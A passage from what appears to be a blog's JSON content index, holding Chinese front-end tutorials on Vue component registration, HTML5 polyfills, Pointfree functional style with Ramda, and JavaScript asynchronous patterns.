callback) &#123; this.$http.post(http.host + url, data, &#123; emulateJSON: true &#125;).then(res =&gt; &#123; callback(res.body) &#125;, err =&gt; &#123; console.log(err) &#125;)&#125; 使用这种方法简单粗暴建议使用官方提供的 Vue.extend() 创建组件和注册组件当然上面的方式只是能让我们继承Vue实例做一些扩展的动作。看Vue中如何创建一个组件并注册使用。 Vue提供了一个全局注册组件的方法：Vue.component。 123456789101112131415语法： Vue.component( id, [definition] )参数： &#123;string&#125; id 组件的名字，可以当HTML标签用，注意组件的名字都是小写，而且最好有横线和字母组合。 &#123;Function | Object&#125; [definition] 组件的设置 用法：注册或获取全局组件。注册还会自动使用给定的id设置组件的名称// 注册组件，传入一个扩展过的构造器Vue.component('my-component', Vue.extend(&#123; /* ... */ &#125;))// 注册组件，传入一个选项对象（自动调用 Vue.extend）Vue.component('my-component', &#123; /* ... */ &#125;)// 获取注册的组件（始终返回构造器）var MyComponent = Vue.component('my-component') 简单demo： 1234&lt;div id=\"example\"&gt; &lt;!--组件直接跟普通的标签一样的使用。--&gt; &lt;my-component&gt;&lt;/my-component&gt;&lt;/div&gt; 123456789// 注册一个组件Vue.component('my-component', &#123; // 模板选项设置当前组件，最终输出的html模板。注意：有且只有一个根元素。 template: '&lt;div&gt;A custom component!&lt;/div&gt;'&#125;)// 创建根实例new Vue(&#123; el: '#example'&#125;) 那么我们注册一个组件自动帮我生成 label和radiobutton组合。12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Vue入门之extend全局方法&lt;/title&gt; &lt;script src=\"https://unpkg.com/vue/dist/vue.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"app\"&gt; &lt;!--组件名直接可以当标签使用。--&gt; &lt;radio-tag rid=\"rBas\" txt=\"篮球\" val=\"1\"&gt;&lt;/radio-tag&gt; &lt;!--组件的属性也可以使用Vue的绑定的语法，下面是动态绑定数据给子组件--&gt; &lt;radio-tag :rid=\"demoId\" :txt=\"demoText\" :val=\"demoVal\"&gt;&lt;/radio-tag&gt; &lt;/div&gt; &lt;script&gt; // 定义组件模板，模板必须有且只有一个根元素。 var temp = '&lt;div&gt;&lt;label v-bind:for=\"rid\"&gt;&#123;&#123; txt &#125;&#125;&lt;/label&gt;&lt;input :id=\"rid\" type=\"radio\" v-bind:value=\"val\"&gt;&lt;/div&gt;'; // 注册一个全局的组件 Vue.component('radio-tag', &#123; // 组件的名字不能有大写字母，跟React的曲别啊。另外组件名最好是小写字母加横线组合。 template: temp, props: ['rid', 'txt', 'val'], // 设置组件的属性有哪些，定义标签的属性一致。 data: function () &#123; // 注意属性名都得是小写，不然会不认的。 return &#123; // 在组件的定义中data必须是函数，而且必须有返回值返回&#123;&#125;也是可以的。 &#125; &#125; &#125;); // 初始化一个Vue实例 var app = new Vue(&#123; el: '#app', data: &#123; demoId: 'ft', demoText: '足球', demoVal: 2 &#125; &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 注意点: 组件的名字都必须是小写【其实是非必须，但是为了不麻烦就强制吧】！！！而且建议是小写字母和横线的组合比如： my-radiobtn 注册组件的时候，可以传入一个选项对象进行配置。其中props是设置当前组件的属性，属性也都必须小写。属性是连接父容器和子组件的桥梁。 注意：属性名和组件的名字都要小写啊，不然vue不会认的。 编写组件代码最好配合Vue的chrome插件：vue-devtool 组件可以返还自己的数据，但是必须是函数。data必须是Function 局部注册组件全局注册组件就是使用全局API Vue.componet(id, {....})就行了，当然我们有时候需要注册一个局部模块的自己用的组件。那么就可以用下面的方式了。 12345678910var Child = &#123; template: '&lt;div&gt;A custom component!&lt;/div&gt;'&#125;new Vue(&#123; // ... components: &#123; // &lt;my-component&gt; 将只在父模板可用 'my-component': Child &#125;&#125;) 父子组件传值123456789101112131415161718&lt;template&gt;&lt;div class=\"publicHeader\"&gt; &lt;comment :name=\"name\"&gt;&lt;/comment&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import comment from '../comment/comment.vue'export default &#123; data()&#123; return &#123; name:\"万翼峰\" &#125; &#125; components:&#123; comment &#125;&#125;&lt;/script&gt;","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"HTML5就是现在：深入了解Polyfills","date":"2017-01-05T06:33:21.000Z","path":"2017/01/05/HTML5就是现在：深入了解Polyfills/","text":"利用 HTML5来搭建网站和应用可能是一项艰巨的任务。尽管现在越来越多的现代浏览器正在更多的支持Html5新特性，但实际上只有很少部分人能够幸运的只需要为这些最新的浏览器编写代码。作为一个专业的开发者，你必须要花很多精力来调整不自由的空间排版和实现承诺过的特性以及面对现在的现实情况，这些都是因为浏览器的碎片化。好消息是 IE 9 和 10 都已经支持HTML5 了，用户可以抛弃旧版的 Internet Explorer 浏览器了，不过对于开发者而言他们还需要考虑支持旧版的浏览器。 不管怎样，这并不是说你必须要在接下来的时间里放弃使用 HTML5，好在网站可以使用很多技术来优雅的支持多种不同的情况，如多种屏幕尺寸和不同的 CSS 功能，这些科技也可以达到让人惊讶的完善的跨浏览器的 HTML5 支持。尽管旧浏览器缺少很多 HTML5 新 API ，不过JavaScript是一个不可思议的修复语言，可以追加很多浏览器原生不支持的特性 跨浏览器支持大量使用 HTML5 最棘手的问题是我们别无他选的要支持旧的浏览器，而他们对新的 API 有的支持很少甚至有些根本不支持。适应新的网页技术让我们对跨浏览器差异不寒而栗，还有难以维护的分支代码、浏览器探测和其他一堆问题。尽管如此我们还有一个低调的技术，它可以将这些问题缓解一些，虽然说不定你的用户过了一晚就已经把他们的浏览器升级成最新的了，这个功能就是：polyfills。 Polyfilling 是由 RemySharp 提出的一个术语，它是用来描述复制缺少的 API 和API 功能的行为。你可以使用它编写单独应用的代码而不用担心其他浏览器原生是不是支持。实际上，polyfills并不是新技术也不是和 HTML5 捆绑到一起的。我们已经在如json2.js，ie7-js 和为 IE 浏览器提供透明 PNG 支持的 JS 中使用过了。而和现在 polyfills 的区别就是去年增加的 HTML5 polyfills。 Polyfill 是什么？为了具体说明我想要说的，我们来看一下 json2.js。特别注意第一行的 JSON.parse : 1 if (typeof JSON.parse !==’function’) { 2 // Crockford’s JavaScript implementation of JSON.parse 3 } 使用 typeof 测试这段代码，如果浏览器有原生的执行 JSON.parse，那么 json2.js 就不会去干扰或者重定义它。如果原生的 API 不可用，json2.js 就会执行一段 JavaScript 脚本来实现，它和原生的 JSON API 是完全兼容的。最后你可以在网页上使用 json2.js 而且不用考虑浏览器运行的是哪种代码。 这显示出了 polyfilling 的优势 - 不仅是兼容方面，更是提供了一种接近标准 API 的执行方式。除此之外，不需要再知道那些站点的特有代码或者考虑兼容层的存在。最后，我们会看到一个干净，简单，而且有站点特有代码的结果，其他旧的浏览器也可以使用新 API。 HTML5 的新语义元素HTML5 中对于polyfil来说最简单的特性就是设置已经增加了的语义元素，如，，和。他们中的大多数和，的表现没有区别，但是它们有自己语义化的意义。因为这些元素是标准通用内置语言(SGML)，所以好处就是像 IE6 这样的旧浏览器也能够显示他们。不过 IE浏览器的奇怪之处就是它只应用那些它承认的 CSS 样式。因此，即使旧的 IE浏览器显示了 HTML5 的新语义元素，但是它仍会忽视那些用户自定义的样式。 幸运的是，Sjoerd Visscher 为 IE 找到了一个简单的解决方法，John Resig 又让它发扬光大。在使用任意元素形式的时候调用 document.createElement()，这样就可以让 IE 浏览器运用 CSS 中所有的样式了。 例如，在 中单独调用 document.createElement(‘article’)就可以让 IE 浏览器强制运用CSS中的 元素。 1 ** 2 ** 3 **HTML5 Now? 4 ** 5 article { margin: 0 auto; width: 960px; } 6 7 ** 8 document.createElement(‘article’); 9 10 11 ** 12 ** 13 14 15 16 示例1：调用document.createElement 改变了 IE 浏览器应用的 CSS 样式 不过，没人愿意每次都为 HTML5中那么多新增的语义元素手动添加 createElement 声明。而这就是 polyfill 最擅长的。有一个叫做 html5shim（也就是 html5shiv） 自动完成了设置 IE 浏览器和新语义元素的兼容性。 举例说明，示例1中的代码可以用html5shim 来重构，见示例2. 1 ** 2 ** 3 **HTML5 Now! 4 ** 5 article { margin: 0 auto; width: 960px; } 6 7 ** 8 9 ** 10 11 ** 12 ** 13 14 15 16 示例2 使用 html5shim polyfill 注意脚本周围的描述是参考 html5shim的。这保证了这个 polyfill 只会在比 IE9 更旧的 IE浏览器上加载。而其他已经支持新语义元素的浏览器则不需要浪费时间下载，暂停或者执行。 # 另外一个可考虑的选择如果你对 HTML5 非常感兴趣而在读这篇文章，相信你可能已经了解使用 Modernizr 了。不过你可能还不知道 Modernizr 其实已经内建了 html5shim 功能。如果你是为了探测特性而使用 Modernizr，那么你已经落后于 HTML5 新特性的兼容性了。 持续的客户端存储 很多年来，我们除了一起解决厂商专有的 DOM 扩展和自有的插件来保持浏览器的长期状态的问题别无他选。这些解决方案中就包括火狐的 globalStorage，IE 的userData,cookie 和 像 Flash 或者Google Gears。虽然这些方案是可行的，不过这些解决方法都很过时，乏味，难以维护而且易出错。 为了弥补这些问题，HTML 中最受欢迎的扩展之一就是浏览器数据长期存储的标准 API：localStorage。这个API 提供了一个持续的客户端/服务器端的 key/值存储,它可以为每个用户访问的每个网站存储最多5 MB 的独立数据。你可以把 localStorage 当做一个易用的庞大 cookie而且不需要每次都不需要浏览器和服务器进行 HTTP 请求。localStorage 特性是那些需要浏览器专有数据项目最完美的搭档，就像记住偏好和本地缓存的远程数据。 现在所有高级的浏览器都已经支持 localStorage 特性了， IE8 也包括在其中，不过在比 IE8 旧一些的版本中就不支持了，同时，还是有 polyfill 的跨浏览器存储可以让旧版的浏览器也支持这样的特性。从简朴的 RemySharp 的 Storage polyfiller 到可以向下兼容的 store.js 和 PersistJS，还有 LawnChair 的全功能 API 和 AmplifyJS 存储模块。 例如，下面你可能是使用 AmplifyJS 存储模块来将数据保存在用户浏览器中而且不借助 cookies - 就算那位用户使用的是 IE6: 1 // Sets a localStorage variable ‘Name’with my name in it. 2 amplify.store(‘name’,’Dave Ward’); 3 var website ={ 4 name:’Encosia’, 5 url:’http://encosia.com&#39; 6 } 7 // The library takes care of serializingobjects automatically. 8 amplify.store(‘website’, website); Pulling that dataout at a later date becomes extremely easy: 1 // The values we stored before could thenbe used at a later time, even 2 // during a different session. 3 var $personLink = $(‘‘,{ 4 text: amplify.store(‘name’), 5 href: amplify.store(‘website’).url 6 }); 7 $personLink.appendTo(‘body’); 需要再说一次的是使用 localStorage 或者是基于 localStorage 的 API 的优势是数据不需要经过每次 HTTP 请求，也不需要调用像 Flash 这样的重量级的插件来存储数据。数据被保存在一个真实的，独立的本地存储机制中，这让缓存数据到本地和开发需要良好支持离线使用的网站变得很顺手。 使用什么Remy Sharp 的Storage Polyfiller 是唯一一个可以有资格作为 polyfill 使用的，因为其他的都不能完美的模仿 HTML5 localStorage API。不过不管怎样，store.js 和 AmplifyJS 存储模块提供了很大范围的旧浏览器兼容支持，这点很难被忽视。 地理位置地理位置是另一个成熟的 polyfill HTML5 特性。如果浏览器都和操作系统都支持地理位置而且它们的设备上都配有 GPS 传感器，HTML5 提供了地理位置 API 的功能可以允许 JavaScript 代码判断你的页面是从何处访问的。 移动设备是最让人惊讶的基于浏览器的地理位置使用示例。将内置的 GPS 硬件模块和现代浏览器整合起来很好的支持了 HTML5 的地理位置 API，Android和 iOS设备都支持 HTML5 地理位置，而且和原生应用一样准确。 JavaScript 在那些条件好的环境下需要访问地理位置，就像下面这么简单： 1 navigator.geolocation.getCurrentPosition(function(position){ 2 var lat =position.coords.latitude; 3 var long =position.coords.longitude; 4 console.log(‘Current location: ‘, lat, log); 5 }); 对于移动应用来说这点很棒，但是桌面设备通常不会配备 GPS 传感器，我们也都习惯了。不过那些在我们身边很常见的基于位置的广告们他们已经比地理位置 API 存在的时候长多了。因此在缺乏硬件支持的桌面浏览环境下获取地理位置也是可以的。 JavaScript 目前的做法是在已知的 IP 位置库中寻找访问者的 IP 地址。这种做法显然没有使用 GPS 设备精确，不过这些数据库通常能够准确定位区域位置，这对于很多应用来说已经足够了。 你或许已经知道无GPS 的更精确的地理位置定位不仅仅依赖查找 IP 地址。 通常来说这些增强定位准确性的方法都是借助 Wi-Fi 热点的位置库来协助完成的。不幸的是，目前浏览器中运行的 JavaScript代码不能够从系统底层调用信息。所以， polyfill 目前不可以使用基于 Wi-Fi 的技术，我们只可以使用 IP查找来代替。 Paul Irish 写了一个可以为旧浏览器和缺少 GPS 传感器的硬件提供定位的简单的地理位置 polyfill。它使用了谷歌的地理位置 API 来将用户的 IP 地址转换成相近的物理地理位置。它是一个真实的 polyfill，它将地理位置功能加入到了 navigator.geolocation对象中，不过只是在浏览器原生没有提供地理位置 API 的情况下使用。 浏览历史和导航简单的DHTML效果提供了更加结构化的客户端特性，例如基于 AJAX 的分页和单页界面，这些结构变化放弃了和浏览器内置的导航和历史功能同步。当用户很自然的尝试用他们的返回按钮回到上一页页面或者应用的状态的时候，事情就不那么好了。我们搜索“禁用返回按钮”就会发现这个问题对现代网页开发的坏影响有多少了。 操作浏览器地址的“Hash”部分可以帮助我们解决部分问题。因为Hash原本就是用来在同一个页面中在不同的导航点之间跳转，更改链接的Hash值不会让页面像更改到相关的链接前缀那样刷新。利用Hash值允许客户端和JavaScript驱动的改变同步来保持浏览器显示的地址，这样就不需要使用传统的导航事件了。 Onhashchange 事件当操作浏览器Hash部分被很好的支持了，甚至连在 IE6 上都是，直到最近一个标准的监控Hash变化的方法才变得难以捉摸。最近的新浏览器支持了 onhashchange 事件，当地址的Hash部分改变的时候它就被触发了 - 可以完美的检测用户想通过浏览器的导航控制改变客户端状态的情况。可惜的是，onhashchange 事件只有相对较新的浏览器才支持，从 IE8 和 Firefox 3.6 之后都支持。 虽然 onhashchange 事件并不支持旧的浏览器，不过有可以为旧浏览器提供一个抽象的层的库文件。这些兼容的层使用浏览器特有的属性来复制标准的 onhashchangge 事件，甚至可以每一秒监控 location.hash 好多次，并且当地址Hash值在浏览器中改变的时候作出响应。 一个不错的选择是 Ben Alman 的 jQuery Hashchange 插件，这是他从自己开发的很流行的 jQueryBBQ 插件中提取出来的。 Alman 的 jQueryHashchange 提供了一个非常深层的跨浏览器的 hashchange 事件兼容性。我有点犹豫要不要把它称为 polyfill，因为这需要 jQuery 而且不能够准确的复制出原生 API ，不过当你的页面已经使用了 jQuery 的时候它真的很棒！ # 超越 HashState操作Hash**值是一个解决客户端状态管理问题的好方法，不过它还是有缺点的。自从基于Hash值的链接会让用户迷糊并且和页面上已有的导航冲突，控制浏览器导航特性就不是最好的方法了。 一个更根本的问题是浏览器并没有将Hash部分的浏览器请求加入到 HTTP 请求中。没有访问链接中的Hash位置，所以没可能立即返回到用户给页面加书签、通过邮件接收或者通过社交网络分享后相同的状态。这导致了网站只可以显示它们的默认页面，初始状态接着再通过一个别扭的转换跳转到期望的位置。为了证明这点在使用性上的影响，你只要看一下 Twitter 和 Gawker Media 的 “hash bang”重设计。 输入 pushState幸运的是，HTML5 引入了一对明显提高了客户端历史管理方案的更先进的 API。通常被称为 pushState，它和 windows.history.pushState 方法和window.onopstate 事件结合起来的，它提供了异步处理整个浏览器地址路径部分和在对Hash**之外的导航事件响应的方法。 在 Github 上查看项目的代码是现实中正在使用 pushState 最佳的示例。因为通过 pushState 处理浏览器的地址不会像传统地址改变那样刷新整个页面，Github 可以在每个代码页面切换之间提供过渡动画，链接还是用户友好的，而不是Hash**标签或者查询字符串。 更好的是，如果你将其中一个链接保存为书签，之后再访问这个链接的时候，Github 会在你第一次请求的时候就立刻给你正确的内容，因为客户端中的链接就和服务器端的链接结构是一样的。就像我前面提到的那样，使用基于Hash的链接是不可能实现这些的，因为服务器和Hash部分的请求是无关的。 在你的代码中使用 onhashchange 和 pushState可惜的是，要想将浏览器不支持的 pushState 特性通过真正的 polyfill pushState 加入进去是不可能的。没有抽象层可以改变在旧浏览器中改变链接会让浏览器跳转和加载页面的事实。不过你可以在支持 pushState 的浏览器中使用它而在不支持的旧浏览器中使用基于Hash部分的链接。 Benjamin Lupton 组建了一个很棒的跨浏览器库，可以有效的解决在管理客户端历史时候遇到的大范围的诡异和不一致的现象。这个库可以用在从 IE6 到最新版的 Chrome 上。使用方法也非常简单。它有一个和 HTML5 自有的 pushState 语法很接近的语法： 1 // This changes the URL to /state1 in HTML5 browsers, and changes it to 2 // /#/state1 in older browsers. 3 History.pushState(null, ‘State 1’,’state1’); 4 // Same as before, but /state2 and/#/state2. 5 History.pushState(null, ‘State 2’,’state2’); 相比准确复制 HTML5 popstate 事件，history.js 包含了许多种类的适配器可以和那些库里的事件系统协调运行。例如，使用jQuery 适配器，你可以 一个事件处理程序和 history.js 的 statechange 事件绑定起来，就像这样： 1 History.Adapter.bind(window,’statechange’,function(){ 2 // Get the newhistory state from history.js. 3 var state =History.getState(); 4 // Write the URLwe’ve navigated to on the console. 5 console.log(state.url); 6 }); 通过 history.js 的pushState 方法，statechange 事件处理程序会在每次浏览器导航到通过 history.js 的 pushState 方法维持的历史节点的时候触发。不论是原生就支持 pushState 的 HTML5浏览器 还是仅支持基于链接Hash部分改变的旧浏览器都会监控这个事件，捕获每次活动。 将这个运用到现实应用中非常简单。你可以想象到将它用在和 AJAX 提供的表格分页和排序中，或者甚至是整站的导航（例如 Gmail 和 Twitter），它们不需要依靠那些大家都很厌恶的Hash链接和重定向。 # 使用 pushScissors 运行使用 pushState 有一件需要注意的事，那就是你必须保证服务器端可以正确的你在客户端适应的每个链接。因为很容易你建立一个客户端的链接你的服务器用一个 404 或者 500 错误响应（举例,/未定义），这样很好的保证了你的服务器端在发送或者进行URL重写的时候尽可能优雅的处理意想不到的链接。例如，如果你有一个多页的报告在 /报告下，使用了 pushState 分成了 /报告/1，/报告/2，/报告/3 等等这么多页，你就要保证服务器端的代码可以优雅的对 /报告/未定义 这样的链接响应。 另外一个稍次一点的可选方案是在你的 pushState 地址中使用查询字符串的链接片段，就像 /报告?页码=2 和 /报告?页码=3。这样最终的链接看起来可能不太好看，不过最起码它们不会导致404错误。 接下来去哪里这篇文章只讲到了 HTML5 polyfill 的一些皮毛。有不少提供了跨浏览器支持如 SVG 和 Canvas 图像，HTML5视频，ECMAScript 5 甚至 WebWorkers 特性的项目。如果你很有学习更多关于这些项目的兴趣，查看下面提供的奇妙的资源吧：https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-browser-Polyfills 原文链接：http://msdn.microsoft.com/en-us/magazine/jj131727.aspx 译文地址: http://blog.csdn.net/wang16510/article/details/8960312","comments":true,"tags":[{"name":"兼容","slug":"兼容","permalink":"http://www.wanyifeng.top/tags/兼容/"},{"name":"HTML5","slug":"HTML5","permalink":"http://www.wanyifeng.top/tags/HTML5/"}]},{"title":"函数式编程","date":"2017-01-05T06:33:21.000Z","path":"2017/01/05/Pointfree 编程风格指南/","text":"Pointfree 编程风格指南 作者： 阮一峰 日期： 2017年3月13日 本文要回答一个很重要的问题：函数式编程有什么用？ 目前，主流的编程语言都不是函数式的，已经能够满足需求。为何还要学函数式编程呢，只为了多理解一些新奇的概念？ 一个网友说： “函数式编程有什么优势呢？” “我感觉，这种写法可能会令人头痛吧。” 很长一段时间，我根本不知道从何入手，如何将它用于实际项目？直到有一天，我学到了 Pointfree 这个概念，顿时豁然开朗，原来应该这样用！ 我现在觉得，Pointfree 就是如何使用函数式编程的答案。 一、程序的本质为了理解 Pointfree，请大家先想一想，什么是程序？ 上图是一个编程任务，左侧是数据输入（input），中间是一系列的运算步骤，对数据进行加工，右侧是最后的数据输出（output）。一个或多个这样的任务，就组成了程序。 输入和输出（统称为 I/O）与键盘、屏幕、文件、数据库等相关，这些跟本文无关。这里的关键是，中间的运算部分不能有 I/O 操作，应该是纯运算，即通过纯粹的数学运算来求值。否则，就应该拆分出另一个任务。 I/O 操作往往有现成命令，大多数时候，编程主要就是写中间的那部分运算逻辑。现在，主流写法是过程式编程和面向对象编程，但是我觉得，最合适纯运算的是函数式编程。 二、函数的拆分与合成上面那张图中，运算过程可以用一个函数fn表示。 fn的类型如下。 123&gt; fn :: a -&gt; b&gt;&gt; 上面的式子表示，函数fn的输入是数据a，输出是数据b。 如果运算比较复杂，通常需要将fn拆分成多个函数。 f1、f2、f3的类型如下。 12345&gt; f1 :: a -&gt; m&gt; f2 :: m -&gt; n&gt; f3 :: n -&gt; b&gt;&gt; 上面的式子中，输入的数据还是a，输出的数据还是b，但是多了两个中间值m和n。 我们可以把整个运算过程，想象成一根水管（pipe），数据从这头进去，那头出来。 函数的拆分，无非就是将一根水管拆成了三根。 进去的数据还是a，出来的数据还是b。fn与f1、f2、f3的关系如下。 123&gt; fn = R.pipe(f1, f2, f3);&gt;&gt; 上面代码中，我用到了 Ramda 函数库的pipe方法，将三个函数合成为一个。Ramda 是一个非常有用的库，后面的例子都会使用它，如果你还不了解，可以先读一下教程。 三、Pointfree 的概念 123&gt; fn = R.pipe(f1, f2, f3);&gt;&gt; 这个公式说明，如果先定义f1、f2、f3，就可以算出fn。整个过程，根本不需要知道a或b。 也就是说，我们完全可以把数据处理的过程，定义成一种与参数无关的合成运算。不需要用到代表数据的那个参数，只要把一些简单的运算步骤合成在一起即可。 这就叫做 Pointfree：不使用所要处理的值，只合成运算过程。中文可以译作”无值”风格。 请看下面的例子。 1234&gt; var addOne = x =&gt; x + 1;&gt; var square = x =&gt; x * x;&gt;&gt; 上面是两个简单函数addOne和square。 把它们合成一个运算。 12345&gt; var addOneThenSquare = R.pipe(addOne, square);&gt;&gt; addOneThenSquare(2) // 9&gt;&gt; 上面代码中，addOneThenSquare是一个合成函数。定义它的时候，根本不需要提到要处理的值，这就是 Pointfree。 四、Pointfree 的本质Pointfree 的本质就是使用一些通用的函数，组合出各种复杂运算。上层运算不要直接操作数据，而是通过底层函数去处理。这就要求，将一些常用的操作封装成函数。 比如，读取对象的role属性，不要直接写成obj.role，而是要把这个操作封装成函数。 1234&gt; var prop = (p, obj) =&gt; obj[p];&gt; var propRole = R.curry(prop)('role');&gt;&gt; 上面代码中，prop函数封装了读取操作。它需要两个参数p（属性名）和obj（对象）。这时，要把数据obj要放在最后一个参数，这是为了方便柯里化。函数propRole则是指定读取role属性，下面是它的用法（查看完整代码）。 123456789101112131415&gt; var isWorker = s =&gt; s === 'worker';&gt; var getWorkers = R.filter(R.pipe(propRole, isWorker));&gt;&gt; var data = [&gt; &#123;name: '张三', role: 'worker'&#125;,&gt; &#123;name: '李四', role: 'worker'&#125;,&gt; &#123;name: '王五', role: 'manager'&#125;,&gt; ];&gt; getWorkers(data)&gt; // [&gt; // &#123;\"name\": \"张三\", \"role\": \"worker\"&#125;,&gt; // &#123;\"name\": \"李四\", \"role\": \"worker\"&#125;&gt; // ]&gt;&gt; 上面代码中，data是传入的值，getWorkers是处理这个值的函数。定义getWorkers的时候，完全没有提到data，这就是 Pointfree。 简单说，Pointfree 就是运算过程抽象化，处理一个值，但是不提到这个值。这样做有很多好处，它能够让代码更清晰和简练，更符合语义，更容易复用，测试也变得轻而易举。 五、Pointfree 的示例一下面，我们来看一个示例。 123&gt; var str = 'Lorem ipsum dolor sit amet consectetur adipiscing elit';&gt;&gt; 上面是一个字符串，请问其中最长的单词有多少个字符？ 我们先定义一些基本运算。 1234567891011121314151617&gt; // 以空格分割单词&gt; var splitBySpace = s =&gt; s.split(' ');&gt;&gt; // 每个单词的长度&gt; var getLength = w =&gt; w.length;&gt;&gt; // 词的数组转换成长度的数组&gt; var getLengthArr = arr =&gt; R.map(getLength, arr); &gt;&gt; // 返回较大的数字&gt; var getBiggerNumber = (a, b) =&gt; a &gt; b ? a : b;&gt;&gt; // 返回最大的一个数字&gt; var findBiggestNumber = &gt; arr =&gt; R.reduce(getBiggerNumber, 0, arr);&gt;&gt; 然后，把基本运算合成为一个函数（查看完整代码）。 123456789&gt; var getLongestWordLength = R.pipe(&gt; splitBySpace,&gt; getLengthArr,&gt; findBiggestNumber&gt; );&gt;&gt; getLongestWordLength(str) // 11&gt;&gt; 可以看到，整个运算由三个步骤构成，每个步骤都有语义化的名称，非常的清晰。这就是 Pointfree 风格的优势。 Ramda 提供了很多现成的方法，可以直接使用这些方法，省得自己定义一些常用函数（查看完整代码）。 12345678&gt; // 上面代码的另一种写法&gt; var getLongestWordLength = R.pipe(&gt; R.split(' '),&gt; R.map(R.length),&gt; R.reduce(R.max, 0)&gt; );&gt;&gt; 六、Pointfree 示例二最后，看一个实战的例子，拷贝自 Scott Sauyet 的文章《Favoring Curry》。那篇文章能帮助你深入理解柯里化，强烈推荐阅读。 下面是一段服务器返回的 JSON 数据。 现在要求是，找到用户 Scott 的所有未完成任务，并按到期日期升序排列。 过程式编程的代码如下（查看完整代码）。 上面代码不易读，出错的可能性很大。 现在使用 Pointfree 风格改写（查看完整代码）。 12345678910&gt; var getIncompleteTaskSummaries = function(membername) &#123;&gt; return fetchData()&gt; .then(R.prop('tasks'))&gt; .then(R.filter(R.propEq('username', membername)))&gt; .then(R.reject(R.propEq('complete', true)))&gt; .then(R.map(R.pick(['id', 'dueDate', 'title', 'priority'])))&gt; .then(R.sortBy(R.prop('dueDate')));&gt; &#125;;&gt;&gt; 上面代码已经清晰很多了。 另一种写法是，把各个then里面的函数合成起来（查看完整代码）。 123456789101112131415161718192021222324252627282930313233&gt; // 提取 tasks 属性&gt; var SelectTasks = R.prop('tasks');&gt;&gt; // 过滤出指定的用户&gt; var filterMember = member =&gt; R.filter(&gt; R.propEq('username', member)&gt; );&gt;&gt; // 排除已经完成的任务&gt; var excludeCompletedTasks = R.reject(R.propEq('complete', true));&gt;&gt; // 选取指定属性&gt; var selectFields = R.map(&gt; R.pick(['id', 'dueDate', 'title', 'priority'])&gt; );&gt;&gt; // 按照到期日期排序&gt; var sortByDueDate = R.sortBy(R.prop('dueDate'));&gt;&gt; // 合成函数&gt; var getIncompleteTaskSummaries = function(membername) &#123;&gt; return fetchData().then(&gt; R.pipe(&gt; SelectTasks,&gt; filterMember(membername),&gt; excludeCompletedTasks,&gt; selectFields,&gt; sortByDueDate,&gt; )&gt; );&gt; &#125;;&gt;&gt; 上面的代码跟过程式的写法一比较，孰优孰劣一目了然。 本文转载于:http://www.ruanyifeng.com/blog/2017/03/pointfree.html","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"Javascript异步编程的4种方法","date":"2017-01-05T06:33:21.000Z","path":"2017/01/05/Javascript异步编程的4种方法/","text":"作者： 阮一峰 日期： 2012年12月21日 你可能知道，Javascript语言的执行环境是”单线程”（single thread）。 所谓”单线程”，就是指一次只能完成一件任务。如果有多个任务，就必须排队，前面一个任务完成，再执行后面一个任务，以此类推。 这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段Javascript代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。 为了解决这个问题，Javascript语言将任务的执行模式分成两种：同步（Synchronous）和异步（Asynchronous）。 “同步模式”就是上一段的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的；”异步模式”则完全不同，每一个任务有一个或多个回调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异步的。 “异步模式”非常重要。在浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应，最好的例子就是Ajax操作。在服务器端，”异步模式”甚至是唯一的模式，因为执行环境是单线程的，如果允许同步执行所有http请求，服务器性能会急剧下降，很快就会失去响应。 本文总结了”异步模式”编程的4种方法，理解它们可以让你写出结构更合理、性能更出色、维护更方便的Javascript程序。 一、回调函数 这是异步编程最基本的方法。 假定有两个函数f1和f2，后者等待前者的执行结果。 f1(); f2(); 如果f1是一个很耗时的任务，可以考虑改写f1，把f2写成f1的回调函数。 function f1(callback){ setTimeout(function () { // f1的任务代码 callback(); }, 1000); } 执行代码就变成下面这样： f1(f2); 采用这种方式，我们把同步操作变成了异步操作，f1不会堵塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行。 回调函数的优点是简单、容易理解和部署，缺点是不利于代码的阅读和维护，各个部分之间高度耦合)（Coupling），流程会很混乱，而且每个任务只能指定一个回调函数。 二、事件监听 另一种思路是采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。 还是以f1和f2为例。首先，为f1绑定一个事件（这里采用的jQuery的写法）。 f1.on(‘done’, f2); 上面这行代码的意思是，当f1发生done事件，就执行f2。然后，对f1进行改写： function f1(){ setTimeout(function () { // f1的任务代码 f1.trigger(‘done’); }, 1000); } f1.trigger(‘done’)表示，执行完成后，立即触发done事件，从而开始执行f2。 这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以“去耦合”（Decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。 三、发布/订阅 上一节的”事件”，完全可以理解成”信号”。 我们假定，存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”（publish）一个信号，其他任务可以向信号中心”订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做“发布/订阅模式”（publish-subscribe pattern），又称“观察者模式”（observer pattern）。 这个模式有多种实现，下面采用的是Ben Alman的Tiny Pub/Sub，这是jQuery的一个插件。 首先，f2向”信号中心”jQuery订阅”done”信号。 jQuery.subscribe(“done”, f2); 然后，f1进行如下改写： function f1(){ setTimeout(function () { // f1的任务代码 jQuery.publish(“done”); }, 1000); } jQuery.publish(“done”)的意思是，f1执行完成后，向”信号中心”jQuery发布”done”信号，从而引发f2的执行。 